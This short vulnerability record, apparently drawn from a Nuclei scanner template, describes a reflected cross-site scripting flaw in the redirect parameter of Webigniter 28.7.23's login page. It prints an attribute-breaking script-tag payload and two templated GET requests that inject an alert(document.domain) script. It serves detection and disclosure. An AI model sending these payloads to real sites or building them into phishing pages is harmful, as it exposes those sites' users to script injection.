# Vulnerability: Webigniter 28.7.23 - Cross-Site Scripting
**Classification:** XSS
**Source:** Nuclei Template (`webigniter-xss.yaml`)

## Description
The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload ycsz3"><script>alert(1)</script>bn76w was submitted in the redirect parameter. This input was echoed unmodified in the application's response. By using this Java Script injection, the attacker can trick a lot of users into visiting his dangerous URL which is reflected on the login form, before they log in, warning them that there is a problem with the login

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cms/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w
GET {{BaseURL}}/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w
```

